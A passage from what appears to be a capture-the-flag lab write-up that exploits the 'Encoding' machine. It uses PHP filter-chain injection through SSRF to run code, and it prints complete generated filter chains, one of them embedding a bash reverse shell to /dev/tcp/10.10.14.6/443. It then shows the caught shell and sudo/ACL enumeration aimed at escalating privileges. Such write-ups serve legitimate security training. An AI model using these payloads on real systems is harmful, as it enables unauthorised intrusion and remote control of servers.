+<p>Then came PHP filter injection, explained in detail in <a href="https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html">this Synacktiv post</a>, perhaps first published in <a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">this CTF writeup</a>. I went into this technique in the <a href="/2023/01/21/htb-updown.html#beyond-root---lfi2rce-via-php-filters">Beyond Root for UpDown</a> and made <a href="https://www.youtube.com/watch?v=TnLELBtmZ24">this video</a> showing it in detail:</p>
+<iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="" height="315" src="https://www.youtube.com/embed/TnLELBtmZ24" style="border: 0px;" title="YouTube video player" width="560"></iframe>
+<p>The summary is that by stacking many PHP filters encoding and re-encoding a temporary empty file over and over, eventually I can actually add legit PHP that gets included and executed.</p>
+<h4 id="poc">POC</h4>
+<p><a href="https://github.com/synacktiv/php_filter_chain_generator">This repo</a> has a Python script to generate the filters necessary to inject PHP code into a page. To test, I’ll try to generate a PHP filters to run <code class="language-plaintext highlighter-rouge">phpinfo()</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>python php_filter_chain_generator.py <span class="nt">--chain</span> <span class="s1">'&lt;?php phpinfo(); ?&gt;  '</span>
+<span class="go">[+] The following gadget chain will generate the following code : &lt;?php phpinfo(); ?&gt;   (base64 value: PD9waHAgcGhwaW5mbygpOyA/PiAg)
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
+</span></code></pre></div></div>
+<p>I’m going to use the SSRF to hit <code class="language-plaintext highlighter-rouge">image.haxtables.htb/actions/action_handler.php</code> with a <code class="language-plaintext highlighter-rouge">page</code> parameter of the filters above. <code class="language-plaintext highlighter-rouge">/index.php</code> will be appended to the end, but that doesn’t matter, as <code class="language-plaintext highlighter-rouge">php://temp/index.php</code> will be a valid PHP temp file.</p>
+<p>When I put this into Repeater, it works:</p>
+<p><a href="/img/image-20230412095538974.png"><img alt="image-20230412095538974" src="/img/image-20230412095538974.png"/><em>Click for full size image</em></a></p>
+<h4 id="shell">Shell</h4>
+<p>I’ll generate another filter chain, this time with a <a href="https://www.youtube.com/watch?v=OjkVep2EIlw">Bash reverse shell</a>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>python php_filter_chain_generator.py <span class="nt">--chain</span> <span class="s1">'&lt;?php system("bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1 \""); ?&gt;'</span>
+<span class="go">[+] The following gadget chain will generate the following code : &lt;?php system("bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1 \""); ?&gt; (base64 value: PD9waHAgc3lzdGVtKCJiYXNoIC1jIFwiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxIFwiIik7ID8+)
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
+</span></code></pre></div></div>
+<p>I’ll replace the filters in Repeater, and start <code class="language-plaintext highlighter-rouge">nc</code> listening. On sending, I get a shell as www-data:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.10.11.198 35760
+bash: cannot set terminal process group (800): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">www-data@encoding:~/image/actions$</span><span class="w">
+</span></code></pre></div></div>
+<p>I’ll upgrade the shell with the <a href="https://www.youtube.com/watch?v=DqE6DxqJg8Q">script / stty trick</a>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@encoding:~/image/actions$</span><span class="w"> </span>script /dev/null <span class="nt">-c</span> bash
+<span class="go">script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+sh: 0: getcwd() failed: No such file or directory
+shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
+</span><span class="gp">www-data@encoding:$</span><span class="w"> </span>^Z
+<span class="go">[1]+  Stopped                 nc -lnvp 443
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+<span class="go">nc -lnvp 443
+            reset
+reset: unknown terminal type unknown
+Terminal type? screen
+</span><span class="gp">www-data@encoding:$</span><span class="w"> 
+</span></code></pre></div></div>
+<h2 id="shell-as-svc">Shell as svc</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="sudo">sudo</h4>
+<p>I noticed that the website was running <code class="language-plaintext highlighter-rouge">sudo</code> to run <code class="language-plaintext highlighter-rouge">git</code> commands in the script. That is visible with <code class="language-plaintext highlighter-rouge">sudo -l</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@encoding:$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>      
+<span class="go">Matching Defaults entries for www-data on encoding:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User www-data may run the following commands on encoding:
+    (svc) NOPASSWD: /var/www/image/scripts/git-commit.sh
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">git-commit.sh</code> checks for files that different from the previous commit. If there are files, it adds them. If not, it commits the current changes.</p>
+<div class="language-bash wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nv">u</span><span class="o">=</span><span class="si">$(</span>/usr/bin/git <span class="nt">--git-dir</span><span class="o">=</span>/var/www/image/.git  <span class="nt">--work-tree</span><span class="o">=</span>/var/www/image ls-files  <span class="nt">-o</span> <span class="nt">--exclude-standard</span><span class="si">)</span>
+
+<span class="k">if</span> <span class="o">[[</span> <span class="nv">$u</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+        /usr/bin/git <span class="nt">--git-dir</span><span class="o">=</span>/var/www/image/.git  <span class="nt">--work-tree</span><span class="o">=</span>/var/www/image add <span class="nt">-A</span>
+<span class="k">else</span>
+        /usr/bin/git <span class="nt">--git-dir</span><span class="o">=</span>/var/www/image/.git  <span class="nt">--work-tree</span><span class="o">=</span>/var/www/image commit <span class="nt">-m</span> <span class="s2">"Commited from API!"</span> <span class="nt">--author</span><span class="o">=</span><span class="s2">"james &lt;james@haxtables.htb&gt;"</span>  <span class="nt">--no-verify</span>
+<span class="k">fi</span>
+</code></pre></div></div>
+<h4 id="writable-location">Writable Location</h4>
+<p>Within the <code class="language-plaintext highlighter-rouge">image</code> directory, the only place I can write is in the <code class="language-plaintext highlighter-rouge">.git</code> folder. At first it looks like I www-data wouldn’t be able to write:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@encoding:~/image$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-ld</span> .git/
+<span class="go">drwxrwxr-x+ 8 svc svc 4096 Apr 12 15:21 .git/
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">+</code> means there are extended attributes:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@encoding:~/image$</span><span class="w"> </span>getfacl .git/
+<span class="c"># file: .git/
+# owner: svc
+# group: svc
+</span><span class="go">user::rwx
+user:www-data:rwx
+group::r-x
+mask::rwx
+other::r-x
+</span></code></pre></div></div>
+<p>www-data has read, write, and execute. There’s no where else in <code class="language-plaintext highlighter-rouge">image</code> that www-data can write:</p>
